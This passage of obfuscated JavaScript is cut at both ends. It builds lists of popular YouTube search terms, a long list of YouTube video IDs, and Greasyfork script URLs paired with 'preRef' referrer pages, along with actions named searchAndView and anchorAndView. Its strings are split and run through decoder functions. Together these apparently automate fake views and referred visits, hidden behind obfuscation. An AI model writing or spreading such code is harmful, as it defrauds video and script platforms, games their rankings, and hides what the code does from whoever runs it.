'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + V(0xe, 'Ho*@') + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1471 * -0x1 + -0x1 * 0x102f + -0x26 * -0xf7)), searchTerms[V(0x11, 'F5g@')](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x4e * 0x4 + 0x873 + -0x7 * 0x107)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x94c + -0xdbe + -0x7af * -0x3);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    W(0xa) + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    W(0x8) + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    V(0xb, '!%SL') + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x15) + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x19) + V(0xf, 'UMyo') + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x19) + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
